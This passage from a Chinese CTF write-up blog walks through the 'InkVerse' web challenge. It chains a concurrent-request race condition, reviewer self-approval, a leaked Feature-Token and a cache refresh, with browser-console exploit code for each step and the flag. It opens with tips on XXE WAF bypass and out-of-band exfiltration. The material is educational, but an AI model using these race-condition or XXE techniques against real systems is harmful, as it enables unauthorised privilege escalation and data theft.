+<td><strong>外部 DTD 绕过 WAF</strong></td>
+<td>本地仅保留无害的引用语句，恶意逻辑托管在外部 CDN</td>
+</tr>
+<tr>
+<td><strong>LF 字符处理</strong></td>
+<td>文件读取结果含换行符时，<strong>禁止拼接到域名位置</strong>，应改用 URL Path/Query 或 POST Body 外带</td>
+</tr>
+<tr>
+<td><strong>参数实体嵌套</strong></td>
+<td><code>%eval;</code><br/> 中定义新实体时必须使用 <code>&amp;#37;</code><br/> 转义百分号，这是 DTD 语法强制要求</td>
+</tr>
+</tbody>
+</table>
+<h1 id="inkverse"><a class="markdownIt-Anchor" href="#inkverse"></a> InkVerse</h1>
+<p>本题是一条精心设计的五段式攻击链：<code>/api/tip</code> 并发条件竞争突破声望阈值 → 晋升 Reviewer 权限 → 自审自批文章并导出获取 Feature-Token → 提交特色文章申请触发后台异步审批 → 刷新公告缓存暴露高权限 Flag。题目综合考察了并发条件竞争、权限链设计缺陷、异步任务状态轮询以及服务端缓存机制利用能力。</p>
+<h2 id="解题思路总览-2"><a class="markdownIt-Anchor" href="#解题思路总览-2"></a> 解题思路总览</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">普通用户注册/登录 (Balance=200, Reputation=0)</span><br><span class="line">       ↓</span><br><span class="line">POST /api/tip × N (浏览器控制台并发30请求)</span><br><span class="line">       ↓</span><br><span class="line">Balance &lt; 0, Reputation ≥ 50</span><br><span class="line">       ↓</span><br><span class="line">Role 自动升级为 reviewer</span><br><span class="line">       ↓</span><br><span class="line">GET /review → POST /api/review/single (批准自己的文章)</span><br><span class="line">       ↓</span><br><span class="line">POST /api/export → GET /api/export/status → GET /exports/&lt;file&gt;</span><br><span class="line">       ↓</span><br><span class="line">从导出文件中提取 Feature-Token</span><br><span class="line">       ↓</span><br><span class="line">POST /api/review/feature &#123;article_id, signature=Feature-Token&#125;</span><br><span class="line">       ↓</span><br><span class="line">GET /api/review/feature/status (轮询至 approved)</span><br><span class="line">       ↓</span><br><span class="line">POST /api/bulletin/refresh (刷新公告缓存)</span><br><span class="line">       ↓</span><br><span class="line">GET /bulletin → 🚩 FLAG</span><br></pre></td></tr></table></figure>
+<h2 id="关键源码分析-2"><a class="markdownIt-Anchor" href="#关键源码分析-2"></a> 关键源码分析</h2>
+<h3 id="1-打赏接口-条件竞争入口-apitip"><a class="markdownIt-Anchor" href="#1-打赏接口-条件竞争入口-apitip"></a> 1. 打赏接口 — 条件竞争入口 (<code>/api/tip</code>)</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪代码还原（基于行为推断）</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/tip&#x27;</span>, authMiddleware, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> user = <span class="title function_">getUser</span>(req.<span class="property">user</span>.<span class="property">id</span>);</span><br><span class="line">  <span class="keyword">const</span> amount = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ⚠️ 余额检查与扣款不是原子操作</span></span><br><span class="line">  <span class="keyword">if</span> (user.<span class="property">balance</span> &lt; amount) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Insufficient balance&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在 check 和 update 之间存在时间窗口</span></span><br><span class="line">  user.<span class="property">balance</span> -= amount;      <span class="comment">// 扣款</span></span><br><span class="line">  user.<span class="property">reputation</span> += <span class="number">2</span>;        <span class="comment">// 加声望</span></span><br><span class="line">  <span class="title function_">saveUser</span>(user);</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123;</span><br><span class="line">    <span class="attr">balance</span>: user.<span class="property">balance</span>,</span><br><span class="line">    <span class="attr">reputation</span>: user.<span class="property">reputation</span>,</span><br><span class="line">    <span class="attr">role</span>: user.<span class="property">role</span>,</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;Tip sent successfully&#x27;</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><strong>利用点</strong>：余额校验 (<code>if (user.balance &lt; amount)</code>) 与实际扣款 (<code>user.balance -= amount</code>) 之间没有加锁或事务保护。当同时发送大量请求时，多个请求可能同时通过余额检查（此时余额仍为正），导致余额被扣成负数，但声望持续累加。初始 Balance=200，正常最多 Tip 20 次获得 40 声望，无法达到 Reviewer 所需的 50 声望门槛。通过并发竞争可绕过此限制。</p>
+<h3 id="2-文章导出接口-token-泄露源-apiexport"><a class="markdownIt-Anchor" href="#2-文章导出接口-token-泄露源-apiexport"></a> 2. 文章导出接口 — Token 泄露源 (<code>/api/export</code>)</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 导出文件内容格式 (exports/export_&#123;job_id&#125;_&#123;article_id&#125;.txt)</span><br><span class="line">Title: test</span><br><span class="line">Author: dou</span><br><span class="line">Export-ID: 38</span><br><span class="line">Processed-At: 2026-05-30 04:59:55</span><br><span class="line">Integrity: 098f6bcd4621d373cade4e832627b4f6</span><br><span class="line">Feature-Token: 377818d4208c4dc9270d072e59f6dab06d0dd8df23b953ceefe3bada61827631</span><br><span class="line">---</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
+<p><strong>利用点</strong>：导出文件中包含 <code>Feature-Token</code> 字段，该值是服务端为每篇已发布文章生成的签名凭证。此 Token 并非用于解密或下载验证，而是作为 <code>/api/review/feature</code> 接口的 <code>signature</code> 参数，证明当前 Reviewer 确实有权对该文章发起特色申请。这是整条攻击链中<strong>凭证传递</strong>的关键环节。</p>
+<h3 id="3-特色文章申请-异步处理端点-apireviewfeature"><a class="markdownIt-Anchor" href="#3-特色文章申请-异步处理端点-apireviewfeature"></a> 3. 特色文章申请 — 异步处理端点 (<code>/api/review/feature</code>)</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪代码还原（基于行为推断）</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/review/feature&#x27;</span>, authMiddleware, reviewerMiddleware, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; article_id, signature &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ⚠️ 验证 signature 是否匹配文章的 Feature-Token</span></span><br><span class="line">  <span class="keyword">const</span> expectedToken = <span class="title function_">getFeatureToken</span>(article_id);</span><br><span class="line">  <span class="keyword">if</span> (!signature || signature !== expectedToken) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid signature&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 异步处理，不直接返回结果</span></span><br><span class="line">  <span class="title function_">queueFeatureRequest</span>(article_id, req.<span class="property">user</span>.<span class="property">id</span>);</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Feature request submitted for background processing&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 状态查询接口</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/api/review/feature/status&#x27;</span>, authMiddleware, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; article_id &#125; = req.<span class="property">query</span>;</span><br><span class="line">  <span class="keyword">const</span> status = <span class="title function_">getFeatureStatus</span>(article_id);</span><br><span class="line">  res.<span class="title function_">json</span>(status);</span><br><span class="line">  <span class="comment">// 返回示例: &#123;&quot;status&quot;:&quot;approved&quot;,&quot;created_at&quot;:...,&quot;processed_at&quot;:...&#125;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><strong>利用点</strong>：该接口采用<strong>异步处理模式</strong>，提交后立即返回 “submitted”，实际审批由后台 Worker 完成。必须通过 <code>/api/review/feature/status?article_id=N</code> 轮询确认 <code>status: approved</code> 后，才能进行下一步。许多选手在此处误以为提交即生效，忽略了状态确认环节。</p>
+<h3 id="4-公告缓存刷新-flag-暴露触发器-apibulletinrefresh"><a class="markdownIt-Anchor" href="#4-公告缓存刷新-flag-暴露触发器-apibulletinrefresh"></a> 4. 公告缓存刷新 — Flag 暴露触发器 (<code>/api/bulletin/refresh</code>)</h3>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /bulletin 页面中的隐藏公告（仅 featured_authors 可见） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bulletin-card&quot;</span> <span class="attr">data-visibility</span>=<span class="string">&quot;featured_authors&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>特邀作者奖励<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>恭喜你！作为特邀作者，你可以接触到独家内容和每周摘要报告。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Secret credential: DASCTF&#123;cd6bd9cd-aa78-4bd7-9388-25fa37b002d6&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>利用点</strong>：Bulletin 页面使用了<strong>服务端缓存</strong>机制。即使文章已被标记为 Featured，直接访问 <code>/bulletin</code> 仍然返回旧的缓存内容（不包含特邀作者公告）。必须显式调用 <code>POST /api/bulletin/refresh</code> 使缓存失效并重新渲染，新的 <code>featured_authors</code> 可见公告才会出现在响应中。这是获取 Flag 的<strong>最后一步</strong>，也是最容易被忽略的一步。</p>
+<h2 id="完整-exploit浏览器控制台操作"><a class="markdownIt-Anchor" href="#完整-exploit浏览器控制台操作"></a> 完整 Exploit（浏览器控制台操作）</h2>
+<h3 id="step-1-注册并登录普通用户"><a class="markdownIt-Anchor" href="#step-1-注册并登录普通用户"></a> Step 1: 注册并登录普通用户</h3>
+<p>正常注册账号并登录，进入 Dashboard 确认初始状态：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Balance: 200</span><br><span class="line">Reputation: 0</span><br><span class="line">Role: user</span><br></pre></td></tr></table></figure>
+<h3 id="step-2-条件竞争提升声望"><a class="markdownIt-Anchor" href="#step-2-条件竞争提升声望"></a> Step 2: 条件竞争提升声望</h3>
+<p>在浏览器控制台执行以下代码，同时发送 30 个打赏请求：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">allSettled</span>(</span><br><span class="line">  <span class="title class_">Array</span>.<span class="title function_">from</span>(&#123;<span class="attr">length</span>: <span class="number">30</span>&#125;, <span class="function">(<span class="params">_, i</span>) =&gt;</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/api/tip&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;,</span><br><span class="line">      <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">article_id</span>: <span class="number">1</span>&#125;)</span><br><span class="line">    &#125;).<span class="title function_">then</span>(<span class="keyword">async</span> r =&gt; (&#123;</span><br><span class="line">      i, <span class="attr">status</span>: r.<span class="property">status</span>, <span class="attr">text</span>: <span class="keyword">await</span> r.<span class="title function_">text</span>()</span><br><span class="line">    &#125;))</span><br><span class="line">  )</span><br><span class="line">).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">table</span>(res.<span class="title function_">map</span>(<span class="function"><span class="params">x</span> =&gt;</span> x.<span class="property">value</span> || x.<span class="property">reason</span>)))</span><br></pre></td></tr></table></figure>
+<p>执行后刷新 <code>/dashboard</code>，确认角色升级：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Balance: -80</span><br><span class="line">Reputation: 56</span><br><span class="line">Role: reviewer</span><br></pre></td></tr></table></figure>
+<h3 id="step-3-发布并批准自己的文章"><a class="markdownIt-Anchor" href="#step-3-发布并批准自己的文章"></a> Step 3: 发布并批准自己的文章</h3>
+<p>在首页提交一篇新文章，记录文章 ID（例如 <code>10</code>）。然后进入 <code>/review</code> 面板，点击该文章的 <strong>Approve</strong> 按钮，使其变为 published 状态。</p>
+<p>也可直接在控制台调用：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/review/single&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">article_id</span>: <span class="number">10</span>, <span class="attr">action</span>: <span class="string">&#x27;approve&#x27;</span>&#125;)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="step-4-导出文章获取-feature-token"><a class="markdownIt-Anchor" href="#step-4-导出文章获取-feature-token"></a> Step 4: 导出文章获取 Feature-Token</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 提交导出任务</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/export&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">article_id</span>: <span class="number">10</span>&#125;)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br><span class="line"><span class="comment">// 返回: &#123;&quot;job_id&quot;: 38, &quot;message&quot;: &quot;Export job queued&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待几秒后查询状态</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/export/status&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br><span class="line"><span class="comment">// 返回: &#123;&quot;jobs&quot;: [&#123;&quot;output_path&quot;: &quot;export_38_10.txt&quot;, &quot;status&quot;: &quot;completed&quot;, ...&#125;]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下载导出文件</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/exports/export_38_10.txt&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br><span class="line"><span class="comment">// 从输出中提取 Feature-Token 值</span></span><br></pre></td></tr></table></figure>
+<h3 id="step-5-提交特色文章申请并轮询状态"><a class="markdownIt-Anchor" href="#step-5-提交特色文章申请并轮询状态"></a> Step 5: 提交特色文章申请并轮询状态</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用提取到的 Feature-Token 作为 signature</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/review/feature&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="attr">article_id</span>: <span class="number">10</span>,</span><br><span class="line">    <span class="attr">signature</span>: <span class="string">&#x27;377818d4208c4dc9270d072e59f6dab06d0dd8df23b953ceefe3bada61827631&#x27;</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br><span class="line"><span class="comment">// 返回: &#123;&quot;message&quot;: &quot;Feature request submitted for background processing&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 轮询状态直至 approved</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/review/feature/status?article_id=10&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br><span class="line"><span class="comment">// 返回: &#123;&quot;status&quot;: &quot;approved&quot;, &quot;created_at&quot;: ..., &quot;processed_at&quot;: ...&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="step-6-刷新公告缓存并获取-flag"><a class="markdownIt-Anchor" href="#step-6-刷新公告缓存并获取-flag"></a> Step 6: 刷新公告缓存并获取 Flag</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 刷新缓存</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/bulletin/refresh&#x27;</span>, &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问公告页，搜索 &quot;DASCTF&quot; 即可看到 Flag</span></span><br><span class="line"><span class="comment">// 或直接: document.querySelector(&#x27;[data-visibility=&quot;featured_authors&quot;]&#x27;).innerText</span></span><br></pre></td></tr></table></figure>
+<p>最终在 <code>/bulletin</code> 页面中获得 <code>flag</code></p>
+<h2 id="攻击链总结-2"><a class="markdownIt-Anchor" href="#攻击链总结-2"></a> 攻击链总结</h2>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>接口</th>
+<th>漏洞/机制</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>①</td>
+<td><code>POST /api/tip</code></td>
+<td>余额检查与扣款非原子操作</td>
+<td>并发竞争使 Reputation≥50，晋升 Reviewer</td>
+</tr>
+<tr>
+<td>②</td>
+<td><code>POST /api/review/single</code></td>
+<td>Reviewer 自审自批</td>
+<td>将自己的文章变为 published 状态</td>
+</tr>
+<tr>
+<td>③</td>
+<td><code>POST /api/export</code><br/> + <code>GET /exports/&lt;file&gt;</code></td>
+<td>导出文件泄露敏感凭证</td>
+<td>获取 Feature-Token 作为签名参数</td>
+</tr>
+<tr>
+<td>④</td>
+<td><code>POST /api/review/feature</code></td>
+<td>异步处理 + 签名验证</td>
+<td>提交特色文章申请，等待后台审批通过</td>
+</tr>
+<tr>
+<td>⑤</td>
+<td><code>POST /api/bulletin/refresh</code><br/> + <code>GET /bulletin</code></td>
+<td>缓存刷新暴露高权限内容</td>
+<td>使 <code>featured_authors</code><br/> 可见公告生效，获取 Flag</td>
+</tr>
+</tbody>
+</table>
+<h2 id="踩坑记录-2"><a class="markdownIt-Anchor" href="#踩坑记录-2"></a> 踩坑记录</h2>
+<ul>
+<li><strong>条件竞争是前置必要条件</strong>：初始 Balance=200，单次 Tip 消耗 10 点、增加 2 声望，正常上限为 40 声望，永远无法达到 Reviewer 门槛 50。必须通过并发竞争打破这一数学限制。浏览器控制台 <code>Promise.allSettled</code> 发送 30 个并发请求即可稳定触发。</li>
+<li><strong>Feature-Token 不是下载密钥</strong>：导出文件中的 <code>Feature-Token</code> 容易误导选手尝试用它解密文件或作为 Auth Header 使用。实际上它是 <code>/api/review/feature</code> 的 <code>signature</code> 参数，用于服务端验证请求合法性。</li>
+<li><strong>异步任务必须轮询状态</strong>：<code>/api/review/feature</code> 返回 “submitted for background processing” 仅代表入队成功，不代表审批完成。必须通过 <code>/api/review/feature/status?article_id=N</code> 轮询直到 <code>status: approved</code>，否则刷新 Bulletin 时文章尚未被标记为 Featured，隐藏公告不会出现。</li>
+<li><strong>Bulletin 缓存不会自动失效</strong>：即使文章已成功 Featured，直接访问 <code>/bulletin</code> 仍返回旧缓存。必须显式调用 <code>POST /api/bulletin/refresh</code> 触发缓存重建。公告页面提示 <em>“显示缓存结果。缓存后你的可见性可能发生了变化”</em> 是关键线索。</li>
+<li><strong>API 文档优先于逆向猜测</strong>：题目壳子提示了 <code>/api/docs</code> 可查看完整接口文档。如果一开始就读取文档，可以直接获知 <code>/api/review/feature</code> 的参数格式和 <code>/api/export/status</code> 的存在，避免大量无效路径探测。</li>
+</ul>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/%E8%B5%9B%E9%A2%98/" title="赛题" data-aos="zoom-in">赛题</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag" title="复现">复现</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    <div class="article-nav-link-wrap right">
+        <img data-src="/images/covers/02.jpg" data-sizes="auto" alt="LitCTF2025" class="lazyload">
+      <a href="/2026/05/29/LitCTF2025/" aria-label="后一篇: LitCTF2025"  title="后一篇: LitCTF2025"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          LitCTF2025
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2026
+        <span class="footer-info-sep rotate"></span>
+      Ether
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        19.2k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:26
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#corpgate"><span class="toc-number">1.</span> <span class="toc-text"> CorpGate</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text"> 题目概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%E6%80%BB%E8%A7%88"><span class="toc-number">1.2.</span> <span class="toc-text"> 解题思路总览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text"> 关键源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%AE%BE%E7%BD%AE%E6%8E%A5%E5%8F%A3-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%85%A5%E5%8F%A3-routessettingsjs"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1. 设置接口 — 原型链污染入口 (routes&#x2F;settings.js)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%81%A5%E5%BA%B7%E6%A3%80%E6%9F%A5%E6%8E%A5%E5%8F%A3-%E5%AF%86%E9%92%A5%E8%BD%AE%E6%8D%A2%E8%A7%A6%E5%8F%91%E5%99%A8-routessystemjs"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2. 健康检查接口 — 密钥轮换触发器 (routes&#x2F;system.js)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 